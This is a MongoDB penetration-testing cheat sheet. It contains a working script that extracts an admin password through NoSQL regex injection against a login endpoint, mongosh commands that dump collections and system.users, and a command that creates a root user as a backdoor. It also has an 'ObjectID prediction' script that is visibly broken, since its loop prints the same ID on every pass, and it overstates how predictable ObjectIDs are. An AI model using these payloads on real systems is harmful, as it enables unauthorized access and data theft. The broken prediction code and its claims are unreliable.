## Port 27017 â€” MongoDB Pentesting

::note
MongoDB is a NoSQL document-oriented database that listens on **TCP port 27017** by default. It stores data in BSON (Binary JSON) format. Misconfigured MongoDB instances are commonly found exposed on the internet without authentication, making them a high-value target during penetration tests.
::

::card-group
  ::card
  ---
  title: Default Ports
  icon: i-lucide-network
  ---
  | Port | Service |
  | ----- | ----------------------- |
  | `27017` | MongoDB default |
  | `27018` | MongoDB Shard |
  | `27019` | MongoDB Config Server |
  | `28017` | MongoDB HTTP Interface |
  ::

  ::card
  ---
  title: Protocol & Transport
  icon: i-lucide-cable
  ---
  | Property | Value |
  | ----------- | -------------------- |
  | Transport | `TCP` |
  | Protocol | MongoDB Wire Protocol |
  | Data Format | `BSON` |
  | Auth | SCRAM-SHA-1/256 |
  ::
::

### Data Extraction via NoSQL Injection

::steps{level="4"}

#### Boolean-Based Extraction (Password Enumeration)

```python [nosql_extract.py]
import requests
import string

target = "http://<TARGET>/api/login"
username = "admin"
password = ""
charset = string.ascii_lowercase + string.digits + string.punctuation

while True:
    found = False
    for c in charset:
        payload = {
            "username": username,
            "password": {"$regex": f"^{password}{c}.*"}
        }
        r = requests.post(target, json=payload)
        if "success" in r.text or r.status_code == 200:
            password += c
            print(f"[+] Found so far: {password}")
            found = True
            break
    if not found:
        print(f"[+] Final password: {password}")
        break
```

### MongoDB Object ID Prediction

::note
MongoDB ObjectIDs are predictable. They contain a 4-byte timestamp, 5-byte random value, and 3-byte counter. If you capture one ObjectID, you can predict adjacent ones.
::

```python [objectid_predict.py]
from bson import ObjectId
import datetime

# Known ObjectID from the application
known_id = "507f1f77bcf86cd799439011"
oid = ObjectId(known_id)

# Extract timestamp
timestamp = oid.generation_time
print(f"[+] Generated at: {timestamp}")

# Generate adjacent ObjectIDs (same second)
ts_int = int(timestamp.timestamp())
for counter in range(0, 255):
    predicted = ObjectId.from_datetime(datetime.datetime.fromtimestamp(ts_int))
    print(f"[*] Predicted: {predicted}")
```

curl http://<TARGET>/api/users/507f1f77bcf86cd799439012
curl http://<TARGET>/api/users/507f1f77bcf86cd799439013

::collapsible

| Task | Command |
| ---- | ------- |
| Connect (no auth) | `mongosh <IP>:27017` |
| Connect (with auth) | `mongosh <IP>:27017 -u user -p pass --authenticationDatabase admin` |

| Use database | `use <db_name>` |
| List collections | `show collections` |
| Dump collection | `db.<collection>.find().pretty()` |
| Count documents | `db.<collection>.count()` |
| Get users | `db.system.users.find().pretty()` |

| Create user | `db.createUser({user:"x",pwd:"y",roles:["root"]})` |
